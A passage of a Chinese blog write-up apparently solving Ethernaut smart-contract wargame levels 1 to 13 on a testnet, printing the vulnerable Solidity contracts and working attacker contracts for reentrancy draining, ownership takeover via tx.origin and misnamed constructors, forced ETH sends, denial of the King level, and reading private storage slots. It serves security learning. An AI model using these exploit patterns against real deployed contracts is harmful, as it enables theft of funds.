                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090302300.png"
                      alt="image-20230809030209945"
                ></p>
<p>现在我们更换用户，贡献一下看看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090306707.png"
                      alt="image-20230809030601235"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090306959.png"
                      alt="image-20230809030613402"
                ></p>
<p>奇怪，贡献了很多次，但是贡献值还是0。</p>
<p>去看了看 Remix 的使用，在调用函数时设置好发送的金额即可。（我真傻，真的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092105719.png"
                      alt="image-20230809210513962"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092105679.png"
                      alt="image-20230809210526529"
                ></p>
<p>我们把自己的贡献值加到2000，这就满足<code>receive()</code>函数里面成为 owner 其中一个条件了。</p>
<p>关于<code>receive()</code>，当合约接收ETH的时候它会被触发。条件有两个，一是<code>msg.data</code>为空，二是<code>receive()</code>存在。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071410829.png"
                      alt="image-20230907141005773"
                ></p>
<p>Remix IDE有个可以向合约发送 CALLDATA 的功能，设置金额后把 CALLDATA 留空然后发送即可，这样就能顺利触发<code>receive()</code>函数。满足成为 owner 的条件，owner 成功变更：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092155107.png"
                      alt="image-20230809215512188"
                ></p>
<p>下一步把合约的余额清空，调用提现用的<code>withdraw()</code>函数即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092156103.png"
                      alt="image-20230809215635248"
                ></p>
<p>Balance 处已经变为0了。</p>
<p>接下来在线上环境打一遍，难点在对于<code>web3-eth</code>包中<code>sendTransaction()</code>函数的<a class="link"   href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#sendtransaction" >使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，还有就是不依赖 Remix 对合约的函数进行调用，一般以太坊交易包含四个字段，分别是 to、from、amout、data ，其中函数调用信息封装在 data 字段中（<code>sendTransaction()</code>中形参叫做 value）。</p>
<p>data 字段的数据是对函数签名字符串进行 keccak256 哈希运算之后，取前四个字节。contribute()attack()</p>
<p>先看看调用 contribute 的操作（图丢了，假装有个图吧。应该有个 data 字段，值为 0xd7bb99ba）：</p>
<p>然后是 receive：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092311131.png"
                      alt="image-20230809231110635"
                ></p>
<p>随后再进行 withdraw 的调用即可过关：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092329572.png"
                      alt="image-20230809232951547"
                ></p>
<p>这里需要注意，对于没有用 payable 修饰的方法，其 amout(value) 只能为0</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092329101.png"
                      alt="image-20230809232920062"
                ></p>
<p>满足过关条件了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092331871.png"
                      alt="image-20230809233126836"
                ></p>
<h2 id="02-Fal1out"><a href="#02-Fal1out" class="headerlink" title="02 Fal1out"></a>02 Fal1out</h2><p>看关卡名字估计是<del>整型溢出</del>吧，源码：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;

contract Fallout &#123;
    using SafeMath for uint256; // 应用附加库SafeMath到uint256类型
    mapping(address =&gt; uint256) allocations; // 创建一个地址-&gt;整形的映射
    address payable public owner; // owner的地址变量

    function Fal1out() public payable &#123;
        // 合约的构造函数
        owner = msg.sender; // 初始化owner
        allocations[owner] = msg.value; // allocation分配额的意思
    &#125;

    modifier onlyOwner() &#123;
        // 判断是否为owner的函数修改器
        require(msg.sender == owner, &quot;caller is not the owner&quot;);
        _;
    &#125;

    function allocate() public payable &#123;
        // 充值用的函数，会调用SafeMath库里面的add()函数
        allocations[msg.sender] = allocations[msg.sender].add(msg.value); // 将发送的ETH增加到对应的分配额中
    &#125;

    function sendAllocation(address payable allocator) public &#123;
        // 若分配额&gt;0，则将分配额的ETH转给allocator
        require(allocations[allocator] &gt; 0);
        allocator.transfer(allocations[allocator]);
    &#125;

    function collectAllocationys() public onlyOwner &#123;
        // 将合约余额全部转给owner
        msg.sender.transfer(address(this).balance);
    &#125;

    function allocatorBalance(address allocator) public view returns (uint256) &#123;
        // 查询allocator的分配额余额
        return allocations[allocator];
    &#125;
&#125;
</code></pre>
<p>题目要求是成为该合约的 owner，猜测是 SafeMath 库中的<code>add()</code>函数有漏洞（bushi）。</p>
<p>add()：</p>
<pre><code class="solidity">function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;
    uint256 c = a + b;
    require(c &gt;= a, &quot;SafeMath: addition overflow&quot;);
    return c;
&#125;
</code></pre>
<p>这函数看着也没啥问题啊。。直接试着调用一下构造函数：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121825627.png"
                      alt="image-20230812182550567"
                ></p>
<p>这里的构造函数可以直接调用的原因是，在这个（0.6.x）大版本中构造函数是一个名称与合约名相同的函数，而没有使用关键字等标识修饰。题目中<code>Fal1out()</code>函数与合约名不同，因此不被认为是构造函数，导致该函数被直接调用。</p>
<p>看一眼 owner，好家伙，直接变成我了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121826811.png"
                      alt="image-20230812182637789"
                ></p>
<p>过关。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121827656.png"
                      alt="image-20230812182713614"
                ></p>
<h2 id="03-Coin-Flip"><a href="#03-Coin-Flip" class="headerlink" title="03 Coin Flip"></a>03 Coin Flip</h2><p>本题代码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip &#123;
    uint256 public consecutiveWins; // 连胜数
    uint256 lastHash; // 用于储存上个区块的哈希值
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
     //115792089237316195423570985008687907853269984665640564039457584007913129639935

    constructor() &#123;
        consecutiveWins = 0; // 连胜数
    &#125;

    function flip(bool _guess) public returns (bool) &#123;
        uint256 blockValue = uint256(blockhash(block.number - 1)); // 上一区块哈希

        if (lastHash == blockValue) &#123;
            // 将上一区块的哈希值与储存的上一个哈希进行比较
            revert(); // 若相等，回滚
        &#125;

        lastHash = blockValue; // 将本区块哈希储存
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) &#123;
            // 猜对
            consecutiveWins++;
            return true;
        &#125; else &#123;
            // 猜错
            consecutiveWins = 0;
            return false;
        &#125;
    &#125;
&#125;
</code></pre>
<p>目标是连续猜对结果10次</p>
<p>看样子和随机数的安全性有关，可以自己部署一个镜像合约来进行硬币结果的预测：</p>
<pre><code class="solidity">contract H4cker &#123;
    CoinFlip public myCoinFlip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _adress) public &#123;
        myCoinFlip = CoinFlip(_adress);
    &#125;

    function hack() public &#123;
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        myCoinFlip.flip(side);
    &#125;
&#125;
</code></pre>
<p>这里利用自己构造的攻击脚本去调用目标合约的 flip 函数，经过攻击合约的预测，重复执行10次 hack 函数即可。</p>
<h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a>04 Telephone</h2><p>代码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone &#123;

  address public owner;

  constructor() &#123;
    owner = msg.sender;
  &#125;

  function changeOwner(address _owner) public &#123;
    if (tx.origin != msg.sender) &#123;
      owner = _owner;
    &#125;
  &#125;
&#125;
</code></pre>
<p>目标是成为该合约的 owner，但是调用 changeOwner 函数这笔交易的发起者不能是当前的消息发送者。</p>
<p>先想到通过构造攻击合约去调用 changeOwner ，因为交易发起者 tx.origin 是调用链最开始的调用者，而 msg.sender 是当前调用的消息发送者。</p>
<p>攻击合约：</p>
<pre><code class="solidity">contract Hacker &#123;
    Telephone public myTelephone;

    constructor(address _address) &#123;
        myTelephone = Telephone(_address);
    &#125;

    function hack() public &#123;
        myTelephone.changeOwner(0x42285Fb92421db39b7EddB9E245f4B092bb0e411);
    &#125;
&#125;
</code></pre>
<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309061646160.png"
                      alt="image-20230906164615093"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309061647466.png"
                      alt="image-20230906164727414"
                ></p>
<h2 id="05-Token"><a href="#05-Token" class="headerlink" title="05 Token"></a>05 Token</h2><p>代码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token &#123;

  mapping(address =&gt; uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public &#123;
    balances[msg.sender] = totalSupply = _initialSupply;
  &#125;

  function transfer(address _to, uint _value) public returns (bool) &#123;
    require(balances[msg.sender] - _value &gt;= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  &#125;

  function balanceOf(address _owner) public view returns (uint balance) &#123;
    return balances[_owner];
  &#125;
&#125;
</code></pre>
<p>根据提示，应该是溢出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071205880.png"
                      alt="image-20230907120509823"
                ></p>
<p>题目初始会给予20代币，那就试试看下溢出，即向一个账户转出21代币</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071220732.png"
                      alt="image-20230907122033703"
                ></p>
<p>挺多，应该是2^256^-1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071222831.png"
                      alt="image-20230907122210795"
                ></p>
<h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a>06 Delegation</h2><p>代码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate &#123;

  address public owner;

  constructor(address _owner) &#123;
    owner = _owner;
  &#125;

  function pwn() public &#123;
    owner = msg.sender;
  &#125;
&#125;

contract Delegation &#123;

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) &#123;
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  &#125;

  fallback() external &#123;
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) &#123;
      this;
    &#125;
  &#125;
&#125;
</code></pre>
<p>这里的 fallback() 没有用 payable 修饰，所以转账额度只能是0。</p>
<p>这里的难点是理解并利用 delegatecall() 函数，这是一种特殊类型的消息调用，被称为<strong>委托调用</strong>。它和一般的消息调用的区别在于，目标地址的代码将在发起调用的合约的上下文中执行，并且 msg.sender 和 msg.value 不变。例如这题中就是利用委托调用来调用另一个合约中的函数。</p>
<p>那就试试看调用 pwn() 函数吧，直接在前端控制台 sendTransaction：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071441474.png"
                      alt="image-20230907144125428"
                ></p>
<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20230907143851572.png"
                      alt="image-20230907143851572"
                ></p>
<h2 id="07-Force"><a href="#07-Force" class="headerlink" title="07 Force"></a>07 Force</h2><p>代码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force &#123;/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/&#125;
</code></pre>
<p>竟然是猫猫？（惊</p>
<p>目标是使合约的余额大于0，但看起来并没有能接收代币的函数在。</p>
<p>在寻找没有 payable 修饰的方法的情况下如何向该合约转账时，看到了官方文档的一些信息：</p>
<blockquote>
<p>一个没有 payable fallback 函数的合约，可以作为 coinbase transaction （又名 miner block reward ）的接收者或者作为 <code>selfdestruct</code> 的目标来接收以太币。</p>
</blockquote>
<p>看了一下，利用 selfdestruct 是比较实际的，selfdestruct 可以强制向合约转账。</p>
<p>攻击合约如下：</p>
<pre><code class="solidity">contract Hacker &#123;
    Force force;

    constructor(address _address) &#123;
        force = Force(_address);
    &#125;

    fucntion hack() public &#123;
        address payable addr = payable(address(force));
        selfdestruct(addr);
    &#125;
    
    receive() external payable &#123;&#125;
&#125;
</code></pre>
<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071550611.png"
                      alt="image-20230907155019552"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071550282.png"
                      alt="image-20230907155049231"
                ></p>
<h2 id="08-Vault"><a href="#08-Vault" class="headerlink" title="08 Vault"></a>08 Vault</h2><p>代码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault &#123;
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) &#123;
    locked = true;
    password = _password;
  &#125;

  function unlock(bytes32 _password) public &#123;
    if (password == _password) &#123;
      locked = false;
    &#125;
  &#125;
&#125;
</code></pre>
<p>目标是让 locked 为 false，这里应该是要读取 private 的 password。</p>
<p>插槽 slot 是 Solidity 中合约的状态变量存储的地方，一个插槽有32字节的空间，存储的规则是从第一个状态变量开始逐项连续存储，第一个状态变量存储在 slot0 中，如果插槽剩余空间可以存下下一个状态变量，那么就在当前插槽继续存储，否则存储到下一插槽。很显然题目中的 bytes32 要放在 slot1 中了。</p>
<p>用 Web3.py 连接 Sepolia，然后读一下插槽。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309082340847.png"
                      alt="image-20230908234018791"
                ></p>
<p>拿到了 password</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309081451828.png"
                      alt="image-20230908145153648"
                ></p>
<h2 id="09-King"><a href="#09-King" class="headerlink" title="09 King"></a>09 King</h2><p>代码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King &#123;

  address king;
  uint public prize;
  address public owner;

  constructor() payable &#123;
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  &#125;

  receive() external payable &#123;
    require(msg.value &gt;= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  &#125;

  function _king() public view returns (address) &#123;
    return king;
  &#125;
&#125;
</code></pre>
<p>这题有点复杂，简单来说就像拍卖，谁价高谁是 king，但是当前出价会给到被推翻的 king。此外，当提交实例时，关卡将收回王权，要绕过这个东西。</p>
<p>看了一下，初始的出价为 0.001ETH 拿到 king 是没问题的，问题在于提交时的操作，绕过那个王权收回，没啥头绪。最后收回的操作应该是通过 owner 调用 receive() 实现的，收回后出价会变回0。</p>
<p>那么我们只需要在合约转账给被推翻的 king 时拒收，就可以阻止王权的收回了。</p>
<p>为此，我们需要一个攻击合约，普通的账户并不能拒收转账。</p>
<pre><code class="solidity">contract Hacker &#123;
    address payable target;

    constructor(address payable _target) &#123;
        target = _target;
    &#125;

    receive() external payable &#123;
        require(msg.sender != target);
        (bool success,) = target.call&#123;value: 0.0001 ether&#125;(&quot;&quot;);
        require(success, &quot;Something went wrong&quot;);
    &#125;
&#125;
</code></pre>
<p>这里需要注意转账的方式：transfer() 和 send() 有2300的 gas 限制，所以要使用 call()。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310200456079.png"
                      alt="image-20231020045629006"
                ></p>
<h2 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10 Re-entrancy"></a>10 Re-entrancy</h2><p>代码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;;

contract Reentrance &#123;
  
  using SafeMath for uint256;
  mapping(address =&gt; uint) public balances;

  function donate(address _to) public payable &#123;
    balances[_to] = balances[_to].add(msg.value);
  &#125;

  function balanceOf(address _who) public view returns (uint balance) &#123;
    return balances[_who];
  &#125;

  function withdraw(uint _amount) public &#123;
    if(balances[msg.sender] &gt;= _amount) &#123;
      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);
      if(result) &#123;
        _amount;
      &#125;
      balances[msg.sender] -= _amount;
    &#125;
  &#125;

  receive() external payable &#123;&#125;
&#125;
</code></pre>
<p>目标是掏空合约余额。</p>
<p>标题为重入攻击，原理为：</p>
<p>用一句话来概括就是，攻击者会编写攻击智能合约，调用受害合约，利用自己的 Fallback 函数，循环调用一段受害者合约的代码。由于是因为重复进入受害者合约执行一段代码导致的漏洞，就叫做重入攻击。</p>
<p>本题在 withdraw 函数中采用了先转账后扣取余额的顺序，可以利用攻击合约的回调函数进行重入。</p>
<p>攻击合约：</p>
<pre><code class="solidity">contract Hacker &#123;
    Reentrance public myReentrance;

    constructor(address payable _target) public &#123;
        myReentrance = Reentrance(_target);
    &#125;

    function attack() public payable &#123;
        myReentrance.donate&#123;value: msg.value&#125;(address(this));
        myReentrance.withdraw(myReentrance.balanceOf(address(this)));
    &#125;

    receive() external payable &#123;
        if (address(myReentrance).balance &gt;= 0.001 ether) &#123;
            myReentrance.withdraw(0.001 ether);
        &#125;
    &#125;
&#125;
</code></pre>
<p>调用 attack() 时 msg.value 必须大于等于 0.001ETH。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310230142626.png"
                      alt="image-20231023014236563"
                ></p>
<h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11 Elevator"></a>11 Elevator</h2><p>代码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building &#123;
    function isLastFloor(uint) external returns (bool);
&#125;

contract Elevator &#123;
    bool public top;
    uint public floor;

    function goTo(uint _floor) public &#123;
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) &#123;
            floor = _floor;
            top = building.isLastFloor(floor);
        &#125;
    &#125;
&#125;
</code></pre>
<p>This elevator won’t let you reach the top of your building. Right?</p>
<p>这部电梯不会让你到达楼顶。对吧？</p>
<p>题目意思应该是要使 top 为 true。</p>
<p>题目中把 msg.sender 强制转换为 Building 接口的类型，即 msg.sender 必须是一个实现了 Building 接口的合约，至于使 top 为 true，写个函数骗过去就行了。</p>
<p>攻击合约：</p>
<pre><code class="solidity">contract Hacker is Building &#123;
    Elevator public myelevator;
    uint public n = 0;

    constructor(address _target) public &#123;
        myelevator = Elevator(_target);
    &#125;

    function attack() public &#123;
        myelevator.goTo(114514);
    &#125;

    function isLastFloor(uint) external returns (bool) &#123;
        if (n == 0) &#123;
            n++;
            return false;
        &#125; else &#123;
            n = 0;
            return true;
        &#125;
    &#125;
&#125;
</code></pre>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310230249848.png"
                      alt="image-20231023024949802"
                ></p>
<h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12 Privacy"></a>12 Privacy</h2><p>代码如下：</p>
<pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy &#123;
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) &#123;
        data = _data;
    &#125;

    function unlock(bytes16 _key) public &#123;
        require(_key == bytes16(data[2]));
        locked = false;
    &#125;

    /*
    A bunch of super advanced solidity algorithms...

      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\
      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
  */
&#125;
</code></pre>
<p>看上去就是要把这些 private 的变量读取，然后调用 unlock() 使 locked 为 false，想到读 slot。</p>
<table>
<thead>
<tr>
<th>数据类型</th>
<th>大小</th>
<th>插槽</th>
</tr>
</thead>
<tbody><tr>
<td>bool</td>
<td>1 Byte</td>
<td>Slot 0</td>
</tr>
<tr>
<td>uint256</td>
<td>32 Bytes</td>
<td>Slot 1</td>
</tr>
<tr>
<td>uint8</td>
<td>1 Byte</td>
<td>Slot 2</td>
</tr>
<tr>
<td>uint8</td>
<td>1 Byte</td>
<td>Slot 2</td>
</tr>
<tr>
<td>uint16</td>
<td>2 Bytes</td>
<td>Slot 2</td>
</tr>
<tr>
<td>bytes32[3]</td>
<td>96 Bytes</td>
<td>Slot 3, 4, 5</td>
</tr>
</tbody></table>
<p>经过对各个变量所用存储空间的计算，data[2] 存储于 slot5，上 python 脚本读吧。</p>
<pre><code class="python">from web3 import Web3

w3 = Web3(Web3.HTTPProvider(&#39;https://rpc.sepolia.org&#39;))
# print(w3.is_connected())
print(w3.eth.get_storage_at(&#39;0xDFA42F31cea9d624a9E794D809894D39b4F1fcA9&#39;, 5).hex())
</code></pre>
<p>输出：</p>
<pre><code class="bash">root@fatbee-laptop:/mnt/c/Users/13246/web3# python py/hack_12.py
0x6b6077ff2045271ed9c281d35cb5762eebd69455f990d6d1677c384638a0c72b
</code></pre>
<p>在使用 bytes16() 对 bytes32 进行强制类型转换的时候，64 位十六进制数会只剩下前面的 32 位，使用其作为 unlock() 的参数进行调用即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202310241010622.png"
                      alt="image-20231024101040557"
                ></p>
<h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13 Gatekeeper One"></a>13 Gatekeeper One</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><pre><code class="solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne &#123;

  address public entrant;

  modifier gateOne() &#123;
    require(msg.sender != tx.origin);
    _;
  &#125;

  modifier gateTwo() &#123;
    require(gasleft() % 8191 == 0);
    _;
  &#125;

  modifier gateThree(bytes8 _gateKey) &#123;
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);
    _;
  &#125;

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;
    entrant = tx.origin;
    return true;
  &#125;
&#125;
</code></pre>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li>Remember what you’ve learned from the Telephone and Token levels.</li>
<li>You can learn more about the special function <code>gasleft()</code>, in Solidity’s documentation (see <a class="link"   href="https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and <a class="link"   href="https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>).</li>
</ul>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>合约里面有三个函数修改器，满足这三个修改器里面的断言才能成功执行 enter 函数，那么沿着这些条件倒推就能找出 _gateKey 的值了。</p>
<p>关于 <a class="link"   href="https://docs.soliditylang.org/en/latest/types.html#conversions-between-elementary-types" >Solidity 类型转换 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><strong>gateThree_3</strong>：</p>
<pre><code class="solidity"> require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GG&quot;);
</code></pre>
<p>这里已知的部分是等号右边，tx.origin 即自己的地址，地址 address 类型是大小20字节的十六进制数，而 uint160 所占空间 160bits，即20字节，所以第一层类型转换不会出现信息丢失。</p>
<p>第二层类型转换是由 uint160 到 uint16，由大到小的类型转换必然会造成信息丢失，转换的具体情况：</p>
<pre><code>uint160(tx.origin): 0x42285Fb92421db39XXXXXXXXXX5f4B092bb0e411
              (DEC: 377693759349744031XXXXXXXXXX57517436574663500817)
uint16: 0xe411
  (DEC: 58385)
</code></pre>
<p>其实就是按照目标类型的大小，从右侧开始保留相应的数据，如上面保留2字节的数据。</p>
<p>以上的类型转换都是显式转换。等号的右边的数据类型是 uint16，左边是 uint32，那么两边在使用运算符计算的时候会进行隐式转换，且不造成信息丢失。</p>
<p>这里就是把 uint16 转换为 uint32，具体是在左侧补零，值保持不变。但是第一层是由 bytes8 转换至 uint64，看看如何转换。</p>
<pre><code>uint32(uint64(_gateKey)): 0x0000e411
                    (DEC: 58385)
uint64(_gateKey): 0x********0000e411
            (DEC: Not sure)
_gateKey: 0x********0000e411
</code></pre>
<p>bytesN 类型只能转换为大小相同的 uint 类型，如上面的 bytes8 &#x3D;&gt; uint64，转换后无信息丢失。上面数据的星号可以用任意十六进制数代替。</p>
<p><strong>gateThree_2</strong>：</p>
<pre><code class="solidity">require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GG&quot;);
</code></pre>
<p>这里比较好理解，由 uint64 到 uint32 的类型转换造成的信息丢失，又被 uint32 到 uint64 的隐式转换填充上了0，所以只需要往 _gateKey 的前半部分（星号部分）添加非0的数据即可。</p>
<pre><code>_gateKey: 0x123456780000e411
</code></pre>
<p>这样就能通过 gateThree 的第二部分。</p>
<p><strong>gateThree_1</strong>：</p>
<pre><code class="solidity">require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GG&quot;);
</code></pre>
<p>这里左半边结果是<code>0x0000e411</code>，右半边是<code>0xe411</code>，所以只要不对相差的那四个0做改变就好，因为右半边进行隐式转换后也会变成<code>0x0000e411</code>。</p>
<p><strong>gateTwo</strong>：</p>
<pre><code class="solidity">require(gasleft() % 8191 == 0);
</code></pre>
<p>这里要求剩余的 gas 必须是8191的整数倍，且不能为0，因为 Solidity 对0取模会报出 Panic 错误。</p>
<p>这里需要看实际消耗的 gas，所以要利用以太坊浏览器上链调试，写个初步的攻击合约看看：</p>
<pre><code class="solidity">contract Hack &#123;
    GatekeeperOne public myGate;

    constructor(address _target) public &#123;
        myGate = GatekeeperOne(_target);
    &#125;

    function attack() public &#123;
        myGate.enter(0x123456780000e411);
    &#125;
&#125;
</code></pre>
<p>查看操作码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291626269.png"
                      alt="image-20231129162654806"
                ></p>
<p>看到整个过程中有两个 REVERT，其中第一个是目标合约 gateTwo 中触发的，顺着往上找到了 GAS。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311291631672.png"
                      alt="image-20231129163152030"
                ></p>
<p>对 GAS 的解释是：在这条指令执行之后剩余的 gas，所以这里的 GAS 就是 gateTwo 中的 gasleft()，调一下 gas 就行。</p>
<p>这里把 GAS LIMIT 设置成819100，继续查看：</p>
<p><img  
